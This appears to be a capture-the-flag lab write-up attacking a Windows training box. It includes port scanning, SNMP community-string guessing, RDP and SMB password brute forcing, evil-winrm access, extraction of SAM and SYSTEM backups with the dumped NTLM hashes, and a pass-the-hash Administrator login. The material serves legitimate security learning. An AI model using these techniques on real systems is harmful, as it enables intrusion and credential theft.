@@ -1,0 +1,133 @@
+first do an nmap scan
+	sudo nmap -p- -sC -sV -vv -Pn -A -O 10.10.41.227
+We have quite a few open ports
+	Discovered open port 3306/tcp on 10.10.41.227
+Discovered open port 445/tcp on 10.10.41.227
+Discovered open port 443/tcp on 10.10.41.227
+Discovered open port 80/tcp on 10.10.41.227
+Discovered open port 139/tcp on 10.10.41.227
+Discovered open port 3389/tcp on 10.10.41.227
+
+This is going to most likely be a windows machine, due to port 3389 RDP being open
+Going to the webpage I only see an owl
+I decided to try a directory buster on it while NMAP was still going
+When I saw that /licenses was there I decided to try that and did not get anywhere, however, I do know we are using 
+	an Apacher Server
+	Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10 Server at 10.10.41.227 Port 80
+While NMAP was still going I also decided to try and see if we had some stego happening
+	sudo apt-get install stegcracker
+	wget http://10.10.41.227/owl.jpg
+	cp owl.jpg Desktop
+NMAP is done and we have the differnet services that are running on each port, that should help us a little... I think 
+Other than this I have gotten nowhere, directory buster is not finding anything useful and it doesnt look like we have any stego going on
+I do not have a name yet so we are not going to try for RDP bruteforce
+Port 443 shows the same as port 80 and that is getting us nowhere
+I am not seeing much else, lets try a UDP scan
+Still not seeing anything...
+Ok... there is nothing here to attack...
+	This is a windows Machine, lets try some Windows attacks
+After reading some articles it is normal for SNMP to not show up on a port scan, however the service may be running
+To figure out if the service is running there are a few different attacks that you can do
+	One of those attacks happened to work
+https://github.com/trailofbits/onesixtyone
+Onesixtyone on github is able to find community strings for SNMP
+However, we need a wordlist, I don't know if it comes with one or not
+I looked up on github snmp wordlist and found 100 common snmp words
+From there I copied them, when to /usr/share/wordlists
+mkdir snmp
+cd snmp
+sudo nano snmp.txt
+copied the wordlist
+	onesixtyone 10.10.41.227 -c snmp.txt 
+Now we have a community string, openview
+Lets dump everything 
+	snmp-check -c openview 10.10.41.227
+Jesus that is a lot of information!!! Time to look through here
+Firstly we have a few user accounts, Jareth is one of them the others are pretty default
+	I do know from reading about this box that we can use OSINT or we can bruteforce
+	We know that windows is going to be running SMB, so we can try to brutefoce that
+	We also now that WINRM should be running but we dont even know if we can utilize winrm with our user
+I decided to do all three, lets do some Open Source Intelligence and brute force RDP both ways
+hydra -l Jareth -P /usr/share/wordlists/rockyou.txt rdp://10.10.41.227
+Trying to bruteforce RDP shows that I locked it out... oops maybe I shouldn't have gone soooo hardcore at it
+Jareth is the Goblin King in the movie Labyrinth
+	There are a couple of words in here that may be the password, such as a womans name (Sarah Williams) and her brothers name
+As I was doing this I noticed that crackmapexec smb 10.10.41.227 -u Jareth -p /usr/share/wordlists/rockyou.txt was done
+Alright, sure as hell the name is sarah, lets RDP in
+ok... or maybe not
+Lets us evilwm to find anything else out
+	Incase you never download evil-winrm
+	sudo gem install evil-winrm
+Winrm is a windows remote management tool that can be used for both good and evil, today we are using it for evil
+evil-winrm -u Jareth -p sarah -i 10.10.41.227
+	we are in, that worked out good
+	*Evil-WinRM* PS C:\Users\Jareth\Documents> whoami
+		year-of-the-owl\jareth
+lets see if there are any hidden files
+	attrib -s -h -r /s /d *.*
+nothing in there
+	cd ..
+we need to stick with Jareth because that is the most we have recieved so far, so lets check each directory
+	after going into each area and doing a dir search we find what we are looking for in Desktop
+Now to find the NTLM hashes, hopefully we have the permissions
+cd C:\Windows\System32\config
+	dir
+	nope... permission denied...
+So after a lot of research, and finally just looking it up I learned that we can use an SSID to see the recycling bin, thus allowing us to see if anything was trashed
+*Evil-WinRM* PS C:\> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name              SID
+====================== =============================================
+year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
+
+There is our SSID
+
+cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
+
+dir
+
+We can see that there are backups of the system and SAM, lets get these out of the recyling bin and back into windows
+*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy sam.bak C:\Windows\Temp\sam.bak
+*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy system.bak C:\Windows\Temp\system.bak
+
+*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> download C:\Windows\Temp\sam.bak
+Info: Downloading C:\Windows\Temp\sam.bak to sam.bak
+
+                                                             
+Info: Download successful!
+
+*Evil-WinRM* PS C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> download C:\Windows\Temp\system.bak
+
+Now that we have this back to the drawning board
+I learn that we can use something called pwdump.py to combine files, thus allowing us to make a wordlist off of those files
+To use this we need the creddump7 repo and pycrypto on python version 2
+
+git clone https://github.com/Neohapsis/creddump7 && cd creddump7
+python2 -m pip install pycrypto
+
+Make sure you do not run anything until system.bak downloads (it is going to take a minute to do)
+cd creddump7
+python2 pwdump.py ~/system.bak ~/sam.bak > hash.txt
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
+Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
+
+We got our hashes, now we need to crack the NTLM hash using john the ripper
+	Trying to crack it again... not getting anywhere
+	However above we do have a NTLM hash, which means, if not properly configured
+		we could use the LM portion of the hash for a pass the hash
+evil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.41.227
+That sure as hell works
+	Alright last time we were in the desktop, so lets see if admin.txt is in the desktop
+	cd ..
+	cd Desktop
+	dir
+	cat admin.txt
+
+
